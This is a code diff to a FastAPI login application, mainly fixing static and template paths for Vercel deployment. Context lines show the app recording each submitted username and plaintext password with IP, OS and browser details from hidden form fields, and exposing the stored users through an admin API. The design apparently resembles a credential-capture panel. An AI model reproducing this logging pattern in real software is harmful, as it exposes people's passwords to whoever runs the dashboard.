@@ -1,4 +1,3 @@
-# main.py
 import uvicorn
 from fastapi import FastAPI, Request, Form, Response, Depends, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse
@@ -6,7 +5,7 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 import socketio
 import datetime
-import os
+import os  # <-- Make sure 'os' is imported
 
 # ---------- In-memory prototype stores (NOT for production) ----------
 users = {}  # username -> password (plaintext here for prototype only)
@@ -20,14 +19,37 @@ sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
 app = FastAPI()
 sio_app = socketio.ASGIApp(sio, other_asgi_app=app)
 
-# Static and templates
-app.mount("/static", StaticFiles(directory="static"), name="static")
-templates = Jinja2Templates(directory="templates")
+
+# ====================================================================
+# ---------- START: VERCEL DEPLOYMENT FIX ----------
+
+# Get the absolute path of the directory this file is in
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# Define the absolute path for the 'static' directory
+STATIC_DIR = os.path.join(BASE_DIR, "static")
+
+# Define the absolute path for the 'templates' directory
+TEMPLATE_DIR = os.path.join(BASE_DIR, "templates")
+
+# Create the static directory if it doesn't exist (good practice)
+if not os.path.exists(STATIC_DIR):
+    os.makedirs(STATIC_DIR)
+
+# Mount static files using the ABSOLUTE path
+app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+# Load templates using the ABSOLUTE path
+templates = Jinja2Templates(directory=TEMPLATE_DIR)
+
+# ---------- END: VERCEL DEPLOYMENT FIX ----------
+# ====================================================================
+
 
 # ---------- Helpers ----------
 def record_login(
-    request: Request, 
-    username: str, 
+    request: Request,
+    username: str,
     password: str,
     client_os: str,
     client_browser: str,
@@ -41,9 +63,9 @@ def record_login(
     ts = datetime.datetime.utcnow().isoformat() + "Z"
     
     event = {
-        "username": username, 
-        "password": password, 
-        "ip": ip, 
+        "username": username,
+        "password": password,
+        "ip": ip,
         "ts": ts,
         "os": client_os,
         "browser": client_browser,
@@ -70,8 +92,8 @@ def check_admin_token(request: Request):
     if token != ADMIN_SECRET:
         # Redirect to login if not authenticated
         raise HTTPException(
-            status_code=307, 
-            detail="Admin auth required", 
+            status_code=307,
+            detail="Admin auth required",
             headers={"Location": "/admin/login"}
         )
     return True
@@ -110,8 +132,8 @@ def login_get(request: Request):
 
 @app.post("/login")
 async def login_post(
-    request: Request, 
-    username: str = Form(...), 
+    request: Request,
+    username: str = Form(...),
     password: str = Form(...),
     # NEW: Receive client info from hidden fields
     client_os: str = Form("N/A"),
@@ -175,7 +197,7 @@ def admin_login_post(request: Request, password: str = Form(...)):
 
 @app.get("/api/get_users", dependencies=[Depends(check_admin_token)])
 def api_get_users():
-    return users 
+    return users
 
 @app.get("/admin/dashboard", response_class=HTMLResponse, dependencies=[Depends(check_admin_token)])
 def admin_dashboard(request: Request):
